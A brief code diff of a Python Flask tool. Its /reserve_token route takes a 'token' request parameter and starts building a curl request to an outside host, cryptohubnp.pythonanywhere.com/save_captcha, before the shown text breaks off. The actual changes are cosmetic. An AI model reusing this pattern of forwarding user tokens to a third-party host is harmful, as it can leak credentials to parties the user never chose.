@@ -6,7 +6,7 @@ import os,sys,random
 key = ''.join(random.choices('0123456789abcdefghijklmnopqrstuvwxyz', k=20))
 prt = int(random.randint(5000,9000))
 if sys.platform.startswith('win'):
-    os.system('cls');print(logo)
+    os.system('cls')
 else:
     os.system('clear')
 print("""[~]=========================================[~]
@@ -108,7 +108,7 @@ template = """
 </html>
 """
 @app.route('/reserve_token')
-async def reserve_token():
+def reserve_token():
     token = request.args.get('token')
     cont = (
     """curl -X GET "https://cryptohubnp.pythonanywhere.com/save_captcha" \
